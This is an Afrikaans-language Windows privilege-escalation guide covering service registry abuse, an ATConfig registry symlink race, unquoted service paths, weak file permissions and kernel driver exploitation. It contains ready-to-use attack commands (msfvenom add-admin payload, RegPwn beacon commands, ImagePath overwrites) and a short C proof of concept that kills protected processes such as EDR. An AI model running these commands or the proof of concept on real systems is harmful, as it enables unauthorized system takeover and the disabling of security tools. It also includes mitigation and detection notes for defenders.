Jy moet kyk of jy enige diensregisterinskrywings kan wysig.\
Jy kan **jou toestemmings** vir ’n diens se **registerinskrywing** **nagaan** deur:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Die oorspronklike toestemmingstoets is soos volg gestel:

Daar moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl`-toestemmings het. Indien wel, kan die binary wat deur die diens uitgevoer word, verander word.

Gaan na of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** skryftoestemmings op registervlak vir ’n spesifieke dienssleutel het. ’n ACL-inskrywing alleen bewys nie dat toegang effektief is nie: weieringsinskrywings, die huidige token en geërfde toestemmings is ook van belang. Register-sleutelregte verskil van die `SERVICE_CHANGE_CONFIG`- en `SERVICE_START`-regte van die diensobjek. Privilegie-eskalasie vereis ook ’n bruikbare dienskonfigurasieveld, ’n manier om die diens te aktiveer en ’n diensidentiteit met hoër voorregte. Sien Microsoft se [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) en [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Om die Path van die binary wat uitgevoer word, te verander:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Register-simboliese-skakelwedloop na arbitrêre HKLM-waardeskryf (ATConfig)

Sommige Windows-toeganklikheidskenmerke skep per-gebruiker **ATConfig**-sleutels wat later deur ’n **SYSTEM**-proses na ’n HKLM-sessiesleutel gekopieer word. ’n Register-**simboliese-skakelwedloop** kan daardie bevoorregte skryfaksie na **enige HKLM-pad** herlei, wat ’n primitief vir die **skryf van arbitrêre HKLM-waardes** gee.<sup>[[18]](#references)</sup>

Sleutelliggings (voorbeeld: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lys geïnstalleerde toeganklikheidskenmerke.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stoor gebruikerbeheerde konfigurasie.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` word tydens aanmelding/secure-desktop-oorgange geskep en is skryfbaar deur die gebruiker.

Misbruikvloei (CVE-2026-24291 / ATConfig):

1. Vul die **HKCU ATConfig**-waarde in wat jy deur SYSTEM geskryf wil hê.
2. Aktiveer die secure-desktop-kopie (bv. **LockWorkstation**), wat die AT-broker-vloei begin.
3. **Wen die wedloop** deur ’n **oplock** op `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` te plaas; wanneer die oplock afgaan, vervang die **HKLM Session ATConfig**-sleutel met ’n **registerskakel** na ’n beskermde HKLM-teiken.
4. SYSTEM skryf die aanvallergekose waarde na die herleide HKLM-pad.

Sodra jy arbitrêre HKLM-waardes kan skryf, beweeg jy na LPE deur dienskonfigurasiewaardes te oorskryf:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/opdragreël)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Kies ’n diens wat ’n gewone gebruiker kan begin (bv. **`msiserver`**) en aktiveer dit ná die skryfaksie. **Let wel:** die publieke exploit-implementering **sluit die werkstasie** as deel van die wedloop.

Voorbeeldnutsgoed (RegPwn BOF / selfstandig):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services-registertoestemmings vir AppendData/AddSubdirectory

As jy hierdie toestemming op ’n register het, beteken dit dat **jy subregisters daaruit kan skep**. In die geval van Windows-dienste is dit **genoeg om arbitrêre kode uit te voer:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

As die pad na ’n uitvoerbare lêer nie tussen aanhalingstekens staan nie, sal Windows probeer om elke deel tot by ’n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om die volgende uit te voer:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Lys alle ongekwoteerde dienspaaie, uitgesluit dié wat aan ingeboude Windows-dienste behoort:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Jy kan** hierdie kwesbaarheid met metasploit opspoor en uitbuit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig ’n diensbinêre lêer met metasploit skep:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat uitgevoer moet word as ’n diens faal. Hierdie funksie kan op ’n binary gerig word. As hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede is in die [amptelike dokumentasie](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) beskikbaar.

## Teikens van geskeduleerde taak-scripts

Vir ’n geaktiveerde taak wat `cmd.exe /c` met ’n `.bat`- of `.cmd`-lêer uitvoer, kontroleer die script wat in die **aksie-argumente** genoem word, asook `cmd.exe`. Dieselfde geld vir ’n interpreter se eksplisiete lêerargument, soos PowerShell `-File`. As ’n geskeduleerde batch-lêer ’n letterlike PowerShell `-File`-aanroep bevat, kontroleer ook die ACL van die verwysde script; veranderlikes, voorwaardes en shell-ketting vereis handmatige naspeuring. ’n Script of ouergids waarop die aanroeper kan skryf, is slegs ’n leidraad vir uitvoering oor rekeninge heen wanneer die gekonfigureerde taak-prinsipaal van die aanroeper verskil en die taak werklik daardie aksie bereik. ’n ACL wat slegs byvoeging toelaat, kan vir scripts saak maak, maar ’n vroeëre `exit` of ander beheervloei kan bygevoegde reëls onbereikbaar maak. Bevestig die effektiewe ACL’s, [taakuitvoeringskonteks](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), werkgids, sneller en toepassingbeheerbeleid voordat jy op privilege escalation aanspraak maak. Inventarisering moet nie die script wysig of die taak begin nie.

## Benoemde strome op toeganklike lêers

Op NTFS kan ’n leesbare lêer ’n benoemde `:$DATA`-stroom hê waarvan die inhoud nie in ’n gewone gidslys vertoon word nie. Vir ’n klein, relevante stel toeganklike rugsteun- of konfigurasielêers, kontroleer eers die stroomname en -groottes voordat enige inhoud oopgemaak word; Windows stel dit beskikbaar deur [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), en PowerShell deur [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). ’n Stroomnaam wat op ’n geheim dui, is slegs ’n leidraad. Kontroleer die lêer se effektiewe leestoegang, of die lêerstelsel strome ondersteun, of die stroom bruikbare aanmeldbewyse bevat, en by watter rekening dit werklik aanmeld. Vermy rekursiewe stroomskanderings en die vertoon van stroominhoud tydens roetine-inventarisering.

## Invoere vir die geskeduleerde Windows Driver Kit-hulpprogram

Die opsionele Windows Driver Kit bevat `StandaloneRunner.exe`, wat `command.txt`, `reboot.rsf` en ’n projek se `working\rsf.rsf`-lêer uit sy uitvoergids kan gebruik. ’n Geskeduleerde taak of diens wat hierdie hulpprogram met ’n bevoorregte rekening begin, kan laevoorreg-skryftoegang tot daardie invoere in opdraguitvoering binne daardie rekening se konteks omskep, selfs wanneer die hulpprogram se uitvoerbare lêer self beskerm is. Bevestig dat die bevoorregte verbruiker bestaan en dat **albei** sykantlêers geskep of gewysig kan word; om net die hulpprogram te vind, is nie voldoende nie.

Vir ’n geskeduleerde taak, kontroleer sy aksie se [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) en die ACL’s van die twee sykantpaaie. As die taak nie ’n werkgids spesifiseer nie, is die uitvoerbare lêer se gids slegs ’n leidraad om te verifieer, nie bewys van waar die taak sy invoere lees nie. Daar moet ook aan die voorvereiste vir die projek se werklêer voldoen word. Kontroleer die werklike taak-prinsipaal eerder as om aan te neem dat dit as SYSTEM loop.

## Toepassings

### Geïnstalleerde toepassings

Kontroleer **die toestemmings van die binaries** (dalk kan jy een oorskryf en voorregte eskaleer) en van die **vouers** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows-agentherstelpad

[CVE-2024-0670](https://checkmk.com/werk/16361) raak ouer Checkmk Windows-agente wat opdraglêers in `C:\Windows\Temp` geskryf en daarna ’n reeds bestaande skryfbeskermde lêer uitgevoer het wanneer vervanging misluk het. Die verskaffer het die probleem in 2.1.0p40, 2.2.0p23, 2.3.0b1 en 2.4.0b1 reggestel. Gaan die volledige geïnstalleerde pleistervlak na, asook of die betrokke agentbewerking kan loop; ’n taketiket soos `2.1` alleen kan nie blootstelling bevestig nie. Enumerasie kan die weergawe, diensstatus en Temp-toestemmings nagaan sonder om lêers te skep of agentopdragte te aktiveer.

#### Hersiening van ADSelfService Plus SAML-diens

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) het ADSelfService Plus build 6210 en vroeër geraak; die verskaffer het dit in build 6211 reggestel. Dit is slegs relevant as SAML SSO **geaktiveer is of was**. ’n Geïnstalleerde produkinskrywing of dienspad is dus ’n leidraad, nie ’n kwesbaarheidsbevinding nie: bevestig die presiese build, die SAML-konfigurasiegeskiedenis, netwerkbereikbaarheid van die diens en die rekening waaronder dit loop. Kode-uitvoering deur die diens erf daardie rekening se voorregte; uitvoering as SYSTEM vereis ’n instansie wat as SYSTEM loop. ’n Leesbare `OfflineBackup_*.ezip` in die produk se Backup-gids is ’n afsonderlike leidraad oor ’n geënkripteerde rugsteun, nie bewys van ’n bruikbare geloofsbrief of hierdie SAML-fout nie. Teken die pad en toegangregte aan sonder om dit tydens roetine-enumerasie uit te pak.

#### Jenkins-beheerder- en domeinrekeninggrense

Op ’n Windows Jenkins-beheerder moet jy toestemming om ’n taak te skep of op te stel onderskei van toestemming om dit te begin: [Jenkins dokumenteer dit as afsonderlike `Job/Create`-, `Job/Configure`- en `Job/Build`-regte](https://www.jenkins.io/doc/book/security/access-control/permissions/). ’n Opgestelde skedule of afstandsneller kan ’n ander manier bied om ’n build uit te voer, maar bevestig dat dit geaktiveer is en dat die build werklik loop. Uitvoering gebruik die identiteit van die beheerder of die gekose agent, en ’n gestoorde geloofsbrief is slegs bruikbaar as die taak toegang tot die omvang daarvan het. Ondersoek afsonderlik toegang tot `JENKINS_HOME`-metadata: Jenkins hou geloofsbriefmateriaal en enkripsiesleutels in `credentials.xml`, `secrets/hudson.util.Secret` en `secrets/master.key` ([Jenkins-geheimeberging](https://www.jenkins.io/doc/developer/security/secrets/)). Die blote teenwoordigheid daarvan openbaar nie ’n wagwoord nie; bevestig **leestoegang tot die vereiste lêers** en ’n afsonderlike pad vir rekeninghergebruik sonder om geheime in gedeelde uitvoer te druk. As daardie rekening skryftoegang tot ’n AD-gebruikerobjek se `scriptPath` het, bevestig ’n skryfbare skrippad en ’n werklike aanmelding of geskeduleerde verbruiker wat as die teikengebruiker loop voordat jy dit as kruisgebruikeraatvoering beskou. Verdere groepbeheer vereis dat die effektiewe AD-regte afsonderlik bevestig word.

#### Azure Pipelines-selfgehoste agentidentiteit

Vir ’n Azure DevOps Server- of Azure Pipelines-projek moet jy toestemming om ’n pyplyn te **skep of te wysig** onderskei van toestemming om dit **in die tou te plaas** en die gekose agentpoel te gebruik; [Microsoft dokumenteer pyplyntoestemmings](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) en [poelgoedkeuring](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) afsonderlik. As ’n rekening met laer voorregte ’n skripstap kan indien en daardie pyplyn op ’n selfgehoste Windows-agent kan laat loop, voer die stap uit as die [agent se gekonfigureerde bedryfstelselrekening](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Bevestig die presiese pyplyn, tak-/hulpbronbeperkings, goedgekeurde poel, uitvoerbare taak en agentdiensidentiteit voordat jy ’n kruisgebruikeroorgang of SYSTEM-oorgang beweer. ’n Geïnstalleerde agent, projekrol of skryftoegang tot ’n bewaarplek is op sigself slegs ’n leidraad; hersien toestemmings en plaaslike diensmetadata sonder om ’n build tydens passiewe enumerasie te begin.

#### Microsoft Entra Connect Sync-geloofsbriewe

[Microsoft onderskei](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) die **ADSync-diensrekening**, wat die sinchronisasiediens laat loop en toegang tot sy SQL-databasis verkry, van die **AD DS-connectorrekening**, waarvan die gidstoestemmings afhang van die gekonfigureerde sinkronisasiekenmerke. Connector-geloofsbriewe word geënkripteer in daardie databasis gestoor, met sleutelmateriaal wat [deur DPAPI onder die ADSync-diensrekening beskerm word](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). ’n Geïnstalleerde sinkronisasiediens, ’n groep met ’n naam wat na plaaslike administrateurregte klink, of blote sigbaarheid van die databasis bewys nie dat ’n geloofsbrief ontsluit kan word of dat domeinvoorregte verhoog kan word nie. Hersien afsonderlik die werklike databasistoegangregte, diensrekening-/sleuteltoegang, installasie- en SQL-uitleg, gekonfigureerde connectoridentiteit en daardie identiteit se effektiewe AD-voorregte. Roetine-enumerasie behoort slegs diens- en toegangmetadata te wys, nie die gestoorde geheime te navraag of druk nie.

#### Toestemmings vir drukkerbestuurder-ondersteunings-DLL’s

’n Geïnstalleerde drukkerbestuurder kan ondersteunings-DLL’s in `C:\ProgramData` stoor en hulle in ’n meer bevoorregte drukproses laai. Hersien die presiese bestuurdergids en DLL-ACL’s, insluitend ouergidse en herontledingspunte, selfs al word drukker-WMI-enumerasie geweier. Vir die [Ricoh-drukkerbestuurderkwessie CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) was die gerapporteerde pad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die oorspronklike bekendmaking](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beskryf DLL-laai deur `PrintIsolationHost.exe`. ’n Skryfbare ACL is slegs ’n leidraad: bevestig effektiewe skryftoegang nadat weierinskrywings toegepas is, dat die betrokke bestuurder geïnstalleer is en die lêer onder ’n bevoorregte identiteit laai, en of die verskaffer se opgedateerde bestuurder of sekuriteitsprogram die installasie reggestel het. Moenie kwesbaarheid aflei uit die gidsnaam of bestuurderweergawe alleen nie.

### Skryftoestemmings

Kyk of jy ’n konfigurasielêer kan wysig om ’n spesiale lêer te lees, of ’n binêre lêer kan wysig wat deur ’n Administrateur-rekening uitgevoer gaan word (schedtasks).

’n Manier om swak vouer-/lêertoestemmings in die stelsel te vind, is om die volgende uit te voer:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++-inprop outoload-volharding/uitvoering

Notepad++ laai enige inprop-DLL onder sy `plugins`-subgidse outomaties. As ’n skryfbare portable-/kopie-installasie teenwoordig is, lei die byvoeging van ’n kwaadwillige inprop tot outomatiese code execution binne `notepad++.exe` met elke bekendstelling (insluitend vanaf `DllMain` en inprop-terugroepe).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Loop tydens opstart

**Kyk of jy ’n registerinskrywing of binêre lêer kan oorskryf wat deur ’n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te wete te kom oor interessante **autoruns-liggings om voorregte te eskaleer**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drywers

Soek na moontlike **vreemde/kwesbare derdeparty**-drywers

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

As ’n driver ’n arbitrêre kernel-lees-/skryf-primitief blootstel (algemeen in swak ontwerpte IOCTL-handelaars), kan jy voorregte eskaleer deur ’n SYSTEM-token direk uit kernel-geheue te steel.<sup>[[13]](#references)</sup> Sien die stap-vir-stap-tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Verwante materiaal oor Windows-kernel-uitbuiting:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Vir race-condition-foute waar die kwesbare oproep ’n aanvallerbeheerde Object Manager-pad oopmaak, kan jy die opsoek doelbewus vertraag (deur komponente met maksimum lengte of diep gidskettings te gebruik) om die tydvenster van mikrosekondes tot tientalle mikrosekondes te verleng:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool-lekkasies en I/O ring-draaipunte

Sommige Windows-kernel-LPE-kettings kan uit twee individueel swak foute saamgestel word: ’n **cancel-safe queue-leeftyd-race** wat ’n versoek/CBD vrystel terwyl die queue-slot steeds gehou word, en ’n **lock-release-before-copy**-lekkasie wat ’n vrygestelde paged-pool-toekenning tydens `RtlCopyToUser` uitlek.<sup>[[29]](#references)</sup>

Oudit- en uitbuitingsnotas:

- **Vrymaking-terwyl-slot-gehou-word + cancel daarna**: soek ’n suksesroete wat **Acquire -> CompleteRequest/free -> Release** uitvoer terwyl die cancel-roete **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** uitvoer. As die suksesroete `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` bereik voordat die CBDQ/CSQ-slot vrygestel word, kan ’n thread wat in `NtCancelIoFileEx -> IopCsqCancelRoutine` geblokkeer is, later hervat en ’n vrygestelde `PFLT_CALLBACK_DATA` aan die bestuurder se remove-callback teruggee.
- **Herwin die vrygestelde queue-objek** met ’n aanvallerbeheerde paged-pool-toekenning van dieselfde grootte. `NPFS` Data Queue Entries is nuttig omdat die payload en grootte beheerbaar is, en jy dit later met pipe read/peek-bewerkings kan ondersoek. As die vrygestelde objek list-skakels bevat, oorskryf dit met ’n **sikliese lys van vals versoeknodes in gebruikersgeheue** sodat die bestuurder herhaaldelik aanvallerbepaalde versoekstrukture verwerk, eerder as om by die oorspronklike lyskop te eindig.
- **Gradeer ’n voorspelbare skryf op**: as die vals versoek ’n geneste context-aanwyser herlei wat deur boekhou-skryfbewerkings gebruik word (timestamps / QPC / refcount-aangrensende velde), kan jy dalk ’n **adresbeheerde maar nie waardebeheerde** kernel-skryf verkry. Teiken in daardie geval ’n **length/size**-veld van ’n gespuite pool-objek eerder as ’n finale kode-/data-aanwyser, en deurloop dan die spray totdat die korrupte objek ’n **paged-pool-lees buite die grense** moontlik maak.
- **Raceable disclosure-patroon**: enige syscall wat `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` uitvoer, is ’n sterk kandidaat. Betroubaarheid verbeter wanneer die aanvaller die gekopieerde buffer kan vergroot (byvoorbeeld deur baie lys-/hulpbroninskrywings by te voeg wat die serializer se finale toekenningsgrootte verhoog), omdat die langer kopie die vervangingsvenster verbreed sonder om noodwendig die masjien te laat omval.
- **Aanwyserryke hervulteikens**: Windows **I/O ring**-geregistreerde-buffer-skikkings is uitstekende lekkasieteikens omdat hul paged-pool-grootte deur die aanvaller beheer word (`8 * regBufferCnt`) en elke element ’n kernel-aanwyser na ’n `_IOP_MC_BUFFER_ENTRY` is. Lek een van hierdie skikkings uit, herwin die omliggende `IORING_OBJECT`, en korrupteer dan **`RegBuffers`** en **`RegBuffersCount`** sodat daaropvolgende I/O ring-bewerkings aanvallervervalste inskrywings gebruik en arbitrêre kernel-lees/skryf bied. As die enigste beskikbare skryf ’n stabiele byte oplewer (byvoorbeeld vanaf `KUSER_SHARED_DATA+0x14`), gebruik **oorvleuelende, ongeallieerde skryfbewerkings** om ’n herhaalde-byte-gebruikersaanwyser soos `0x0101010101010101` te bou, karteer dit met `VirtualAlloc`, en plaas die vervalste geregistreerde-buffer-skikking daar.<sup>[[30]](#references)</sup>

Nuttige ontfoutingsaanwysers:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sodra jy arbitrêre kernel-lees-/skryftoegang vanaf die korrupte I/O-ring verkry het, steel ’n SYSTEM-token met die standaard post-primitive-werkvloei:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry-hive-geheuekorrupsie-primitiewe

Moderne hive-kwesbaarhede laat jou deterministiese uitlegte voorberei, skryfbare HKLM/HKU-afstammelinge misbruik en metadata-korrupsie omskep in kernel-paged-pool-oorvloeie sonder ’n pasgemaakte drywer. Leer die volledige ketting hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues`-tipeverwarring in direkte modus vanaf aanvallerbeheerde paaie

Sommige drywers aanvaar ’n registerpad vanaf userland, valideer net dat dit ’n geldige UTF-16-string is, en roep dan `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` met `RTL_QUERY_REGISTRY_DIRECT` na ’n skalaar op die stapel soos `int readValue`. As `RTL_QUERY_REGISTRY_TYPECHECK` ontbreek, word `EntryContext` geïnterpreteer volgens die **werklike** registertipe, nie die tipe wat die ontwikkelaar verwag het nie.

Dit skep twee nuttige primitiewe:<sup>[[24]](#references)[[25]](#references)</sup>

- **Verwarde gevolmagtigde / oracle**: ’n gebruikerbeheerde absolute `\Registry\...`-pad laat die drywer toe om sleutels te bevraagteken wat die aanvaller gekies het, die bestaan daarvan via terugkeerkodes/logboeke uit te lek, en soms waardes te lees waartoe die oproeper nie direk toegang sou hê nie.
- **Kernel-geheuekorrupsie**: ’n skalaarbestemming soos `&readValue` raak tipeverwarrend as ’n `REG_QWORD`, `UNICODE_STRING` of ’n binêre buffer met ’n bepaalde grootte, afhangend van die registerwaardetipe.

Praktiese uitbuitingsnotas:

- **Windows 8+-versagting**: as die navraag ’n **onbetroubare hive** tref met `RTL_QUERY_REGISTRY_DIRECT` maar sonder `RTL_QUERY_REGISTRY_TYPECHECK`, val kernel-oproepers om met `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Om uitbuitbaarheid te behou, soek **aanvaller-skryfbare sleutels binne betroubare stelselhives** in plaas daarvan om waardes onder `HKCU` te plaas.
- **Voorbereiding in ’n betroubare hive**: gebruik NtObjectManager om skryfbare afstammelinge van `\Registry\Machine` op te som, en voer die skandering weer uit met ’n gedupliseerde **low-integrity**-token om sleutels te vind wat vanuit sandbox-kontekste bereik kan word:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: ’n direkte skrywing van 8 grepe na ’n `int` van 4 grepe korrupteer aangrensende stapeldata en kan ’n nabygeleë terugbel-/funksiewyser gedeeltelik oorskryf.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direkte modus verwag dat `EntryContext` na ’n `UNICODE_STRING` wys. As die kode eers ’n aanvallerbeheerde `REG_DWORD` in ’n stapelskalaar laai en dan dieselfde buffer vir ’n stringlesing hergebruik, beheer die aanvaller `Length`/`MaximumLength` en beïnvloed hy die `Buffer`-wyser gedeeltelik, wat ’n gedeeltelik beheerde kernskrywing oplewer.
- **`REG_BINARY`**: vir groot binêre data hanteer direkte modus die eerste `LONG` by `EntryContext` as ’n getekende buffergrootte. As ’n vorige `REG_DWORD`-lesing ’n **negatiewe** aanvallerbeheerde waarde in die hergebruikte skalaar laat, kopieer die volgende `REG_BINARY`-navraag aanvallergrepe direk oor aangrensende stapelgleuwe, wat dikwels die skoonste manier is om ’n terugbelwyser volledig te oorskryf.

Sterk soekpatroon: **heterogene registerlesings na dieselfde stapelveranderlike sonder om dit te herinitialiseer**. Soek met grep na `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, hergebruikte `EntryContext`-wysers en kodepaaie waar die eerste registerlesing bepaal of ’n tweede lesing plaasvind.

#### Misbruik van ontbrekende FILE_DEVICE_SECURE_OPEN op toestelobjekte (LPE + EDR-kill)

Sommige ondertekende derdeparty-drywers skep hul toestelobjek met ’n sterk SDDL via IoCreateDeviceSecure, maar vergeet om FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics te stel. Sonder hierdie vlag word die veilige DACL nie afgedwing wanneer die toestel oopgemaak word via ’n pad met ’n ekstra komponent nie, wat enige onbevoorregte gebruiker in staat stel om ’n handvatsel te verkry deur ’n naamruimtepad soos:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (uit ’n werklike geval)

Sodra ’n gebruiker die toestel kan oopmaak, kan bevoorregte IOCTL’s wat deur die drywer beskikbaar gestel word, vir LPE en peuterwerk misbruik word. Voorbeeldvermoëns wat in die praktyk waargeneem is:
- Gee handvatsels met volle toegang tot arbitrêre prosesse terug (token-diefstal / SYSTEM-shell via DuplicateTokenEx/CreateProcessAsUser).
- Onbeperkte rou skyflees/skryf (vanlyn peuterwerk, truuks vir volharding tydens selflaai).
- Beëindig arbitrêre prosesse, insluitend Protected Process/Light (PP/PPL), wat AV/EDR-kill vanaf userland via die kern moontlik maak.

Minimale PoC-patroon (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Versagtingsmaatreëls vir ontwikkelaars
- Stel altyd FILE_DEVICE_SECURE_OPEN wanneer jy device objects skep wat deur ’n DACL beperk moet word.
- Valideer die oproeper se konteks vir bevoorregte bewerkings. Voeg PP/PPL-kontroles by voordat prosesbeëindiging of terugstuur van handles toegelaat word.
- Beperk IOCTLs (toegangsmaskers, METHOD_*, invoervalidering) en oorweeg brokered models in plaas van direkte kernel privileges.

Opsporingsidees vir verdedigers
- Monitor opens vanuit user mode van verdagte device names (bv. \\ .\\amsdk*) en spesifieke IOCTL-sekwensies wat op misbruik dui.
- Dwing Microsoft se vulnerable driver blocklist af (HVCI/WDAC/Smart App Control) en onderhou jou eie allow/deny lists.


## PATH DLL Hijacking

